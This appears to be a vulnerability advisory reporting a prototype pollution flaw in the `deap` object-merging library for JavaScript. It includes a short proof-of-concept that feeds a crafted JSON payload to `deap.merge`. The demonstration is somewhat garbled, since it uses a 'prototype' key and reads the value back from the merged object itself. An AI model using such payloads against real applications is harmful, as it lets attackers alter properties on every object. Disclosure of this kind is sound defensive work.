# Overview
`deap` is a library for extending and merging objects, deep or shallow, in javascript.

Affected versions of this package are vulnerable to Prototype Pollution. The `utilities` function. It can be tricked into modify the prototype of "Object" when the attacker control part of the structure passed to these function. 
This can let an attacker add or modify existing property that will exist on all object. Hence causing the prototype pollution.

# Proof of Concept
```js
var deap = require('deap');

var obj = deap.merge({}, JSON.parse('{ "testProperty": "hi", "prototype" : { "status" : "pwned!" } }'));
console.log(obj.prototype.status);
```
